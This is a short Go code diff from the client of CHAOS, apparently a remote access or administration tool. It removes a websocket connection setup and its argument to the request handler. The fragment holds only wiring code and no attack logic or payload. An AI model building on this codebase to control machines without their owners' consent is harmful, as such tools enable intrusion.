@@ -4,7 +4,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/environment"
 	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
-	"github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
 	"github.com/tiagorlampert/CHAOS/client/app/services/download"
@@ -31,8 +30,6 @@ func New(configuration *environment.Configuration) *App {
 		log.Fatal("error loading device specs: ", err)
 	}
 
-	connection, _ := websocket.NewConnection(configuration, deviceSpecs.MacAddress)
-
 	httpClient := network.NewHttpClient(10)
 
 	operatingSystem := os.DetectOS()
@@ -53,7 +50,7 @@ func New(configuration *environment.Configuration) *App {
 	}
 
 	return &App{handler.NewHandler(
-		connection, configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
+		configuration, clientGateway, clientServices, deviceSpecs.MacAddress)}
 }
 
 func (a *App) Run() {
